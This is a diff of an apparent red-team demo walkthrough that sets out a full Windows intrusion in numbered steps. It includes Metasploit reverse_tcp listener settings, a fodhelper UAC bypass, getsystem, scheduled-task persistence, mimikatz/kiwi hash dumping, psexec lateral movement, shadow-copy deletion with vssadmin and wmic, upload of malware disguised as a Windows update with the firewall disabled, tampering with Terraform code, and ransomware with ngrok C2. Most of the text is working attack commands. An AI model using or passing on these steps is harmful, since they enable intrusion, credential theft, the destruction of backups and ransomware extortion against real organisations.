@@ -11,6 +11,14 @@ Paste content in powershell_attack.txt into a formatted word document
 2) Enable the listener 
 # sudo msfconsole -r unicorn.rc
 
+# use multi/handler
+# set payload windows/meterpreter/reverse_tcp
+# set LHOST 192.168.230.137
+# set LPORT 8080
+# set ExitOnSession false
+# set EnableStageEncoding true
+# exploit -j 
+
 3) Phish the victim either through email, or via SETOOLKIT via web-attack
 
 4) in the session (likely sessions 1) check on: 
@@ -23,11 +31,11 @@ while you can try to get some basic enumeration going, you cannot get system pri
 
 Lets see what we can do to get privi escalation
 
-5) Privilege escalation
+5) Privilege escalation 
 meterpreter provides a local exploit suggester
 # use Post/multi/recon/local_exploit_suggester
 
-for demo purpose, we will use fodhelper exploit (run on msfconsole)
+for demo purpose, we will use fodhelper exploit (run on msfconsole) (1-bypassuac.txt)
 # use exploit/windows/local/bypassuac_fodhelper
 # set SESSION 1
 # set TARGET 1
@@ -38,7 +46,7 @@ for demo purpose, we will use fodhelper exploit (run on msfconsole)
 
 It will create a new session - so on the new session (eg sessions 2), run the following to get system privi
 # getsystem
-add routing access to this device
+add routing access to this device  (run in session: 2-evasion.txt)
 # run post/multi/manage/autoroute SUBNET=192.168.230.0 ACTION=ADD
 
 6) Evasion
@@ -55,7 +63,7 @@ Now that we have hidden our tracks, we can do more enumeration. Attackers usuall
 here we can see the account policies, the services running, apps installed, etc. 
 it is at this point in time we can disable any anti-virus software that might cause issues. but for the purpose of the demo we will move on.
 
-7) Persistance
+7) Persistance (4-persistance.txt)
 Now we get into persistance. One of the ways is to run a scheduled task to keep the persistance script running. Meterpreter provides a module for us to use
 # background (back to meterpreter)
 # use exploit/windows/local/persistence
@@ -64,14 +72,14 @@ Now we get into persistance. One of the ways is to run a scheduled task to keep 
 # set STARTUP SYSTEM
 # run
 
-8) Credentials
+8) Credentials 
 This will be the point in time we can try to run exploits to get credentials. Meterpreter provides mimikatz module to load, of which we can attempt to dump the hashes. Of course, we can use powershell to pull a mimikatz module to run if you're more comfortable.
 # sessions 2
 # load kiwi
 # help
 We can dump the hashes. In the case of Kiwi, we have the ability to attempt to do a golden ticket creation, exactly what happened with the Solarwind attack. In the interest of time, we will "fast forward" and assume that we have done all the relevant steps to get the domain admin / administrators' passwords
 
-9) Discovery
+9) Discovery (5-network_enumeration.txt)
 This is where we'll start with discovering the network. We can do a network portscan, etc, whatever that is available through meterpreter. For the demo, we will attempt a TTP used by wannacry to exploit vulnerable SMBv1. While most modern Windows hosts are patched, where SMBv1 is disabled, many older Win Servers (2019 and below in my prep for this demo), they are still running SMBv1. 
 # use auxiliary/scanner/portscan/tcp
 # set RHOST 192.168.230.138 
@@ -80,6 +88,7 @@ This is where we'll start with discovering the network. We can do a network port
 # run
 
 Before we move laterally, let's do our ransomware preperation as well. we will delete the shadow copies - since there's no point in a ransomware encrypting everything but at the end of the day it's as simple as restoring from shadow copy. 
+(6-ransomware_preperation.txt)
 # sessions 2
 # execute -f 'vssadmin.exe list shadows'
 # execute -f 'vssadmin.exe delete shadows'
@@ -87,6 +96,7 @@ Before we move laterally, let's do our ransomware preperation as well. we will d
 # execute -f 'wmic.exe logicaldisk get deviceid,volumename,description'
 # execute -f 'wmic.exe shadowcopy delete'
 
+(3-upload_malware.txt)
 We can also upload any additional files we want to the target machine before we move on to the "next" victim
 # upload /var/www/Win20H2Update.exe c:\\windows\\system32
 # upload /var/www/winupdate.ps1 c:\\windows\\system32
@@ -98,7 +108,7 @@ We can also upload any additional files we want to the target machine before we 
 # execute -f update.bat -H (this will run a bat file to 1) decode Win20H2Update.exe using the microsoft.crt, and 2) disable windows firewall)
 # execute -f Win20H2Update.exe -H
 
-10) Lateral movement
+10) Lateral movement (7-lateralmovement.txt)
 As shared, for the demo we're making use of the SMB exploit to move laterally.
 # use exploit/windows/smb/psexec
 # set RHOST 192.168.230.138
@@ -109,7 +119,7 @@ As shared, for the demo we're making use of the SMB exploit to move laterally.
 # set lport 8080
 # run
 
-11) Exfiltration
+11) Exfiltration (8-exfiltrate_data.txt)
 Now that we have SYSTEM access, the idea is to find the crown jewels. Of course, I won't bore you with details, but just that we see that there's a lazy admin who decided to code with his secret key exposed and in plain text. 
 We'll make the relevant changes to his terraform code so that when it runs, it will upload a file. In my context it's a simple plaintext file, but in actual reality, it can be anyway - from a cobalt strike beacon to create more zombies, to pure data exfiltration, etc
 
@@ -145,7 +155,7 @@ resource "aws_instance" "ubuntu_server" {
 End of terraform code
 ############################
 
-12) Extortion
+12) Extortion (9-upload_ransomware.txt)
 Now we come to the attack. In this case, I'll be running a python script that will encrypt all the files. This is a server and client script, whereby the client will reach out to a NGROK address for C2 communication. 
 
 - install ngrok and authorise your ngrok account (follow steps on ngrok. you might need)
